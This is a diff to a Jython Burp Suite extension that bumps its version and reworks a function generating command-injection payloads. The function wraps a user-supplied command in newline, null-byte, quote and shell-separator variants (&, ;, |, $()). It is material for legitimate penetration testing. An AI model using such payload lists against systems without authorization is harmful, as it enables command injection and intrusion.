@@ -16,7 +16,7 @@ try:
 except ImportError:
     print "Failed to load dependencies."
 
-VERSION = "0.34"
+VERSION = "0.35"
 _colorful = True
 
 class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFactory):
@@ -563,32 +563,20 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
 
     def funcRCE(self, ev):
         listRCE = []
-        prefixes = ["", "\\n", "\\\\n", "\\r", "\\\\r", "\\r\\n", "\\\\r\\\\n", "%0a", "0x0a", "%0d", "0x0d", "%0d%0a", "0x0d0a", "%00", "0x00", "%1a", "0x1a"]
-        #prefixes = ["", "\\n", "\\r", "\\r\\n", "%0a", "0x0a", "%0d", "0x0d", "%0d%0a", "0x0d0a", "%00", "0x00", "%1a", "0x1a"]
+        prefixes = ["", "\\n", "\\\\n", "\\r\\n", "\\\\r\\\\n", "%0a", "0x0a", "%0d%0a", "0x0d0a", "%00", "0x00", "%1a", "0x1a"]
         interruptors = ["",  "`", "'", "\\'", "\\\\'", "\"", "\\\"", "\\\\\""]
-        #interruptors = ["", "`", "'", "\\'", "\"", "\\\""]
-        suffixes = ["", "&", "&&", "|", "||", ";"]
-
+        suffixes = ["", "&", "&&", "|", "||", ";"]        
+        
         for prefix in prefixes:
             for interruptor in interruptors:
                 for suffix in suffixes:
                     if prefix[:2].count("\\") == interruptor[:2].count("\\") or prefix.find('\\') or interruptor.find('\\'): 
-                        listRCE.append(prefix + interruptor + suffix + self._txtDictParam.text + "\n")
-                        listRCE.append(prefix + interruptor + suffix + self._txtDictParam.text + interruptor + "\n")
-                        listRCE.append(prefix + interruptor + suffix + self._txtDictParam.text + suffix + "\n")
-                        listRCE.append(prefix + interruptor + suffix + self._txtDictParam.text + suffix + interruptor + "\n")                
-                        if suffix:
-                            listRCE.append(interruptor + suffix + interruptor + self._txtDictParam.text + "\n")
-                            listRCE.append(interruptor + suffix + interruptor + self._txtDictParam.text + interruptor + "\n")
-                        if not prefix:
-                            listRCE.append(interruptor + suffix + "{" + self._txtDictParam.text.replace(" ",",") + "}" + "\n")
-                            listRCE.append(interruptor + suffix + "{" + self._txtDictParam.text.replace(" ",",") + "}" + suffix + "\n")
-                            listRCE.append(interruptor + suffix + "$(" + self._txtDictParam.text + ")" + "\n")
-                            listRCE.append(interruptor + suffix + "$(" + self._txtDictParam.text + ")" + suffix + "\n")
-                        #if suffix or not interruptor:    
-                        #    listRCE.append(prefix + interruptor + suffix + self._txtDictParam.text + suffix + interruptor + "\n")                                        
-                        #    if suffix and prefix and interruptor:
-                        #        listRCE.append(interruptor + suffix + interruptor + self._txtDictParam.text + "\n")
+                        if suffix or not interruptor:
+                            listRCE.append(prefix + interruptor + suffix + self._txtDictParam.text + suffix + interruptor + "\n")
+                            listRCE.append(prefix + interruptor + suffix + self._txtDictParam.text + suffix + "\n")
+                            listRCE.append(prefix + interruptor + suffix + self._txtDictParam.text + "\n")
+                            if suffix and prefix and interruptor:
+                                listRCE.append(interruptor + suffix + interruptor + self._txtDictParam.text + "\n")
 
         listRCE = list(set(listRCE))
         listRCE.sort()
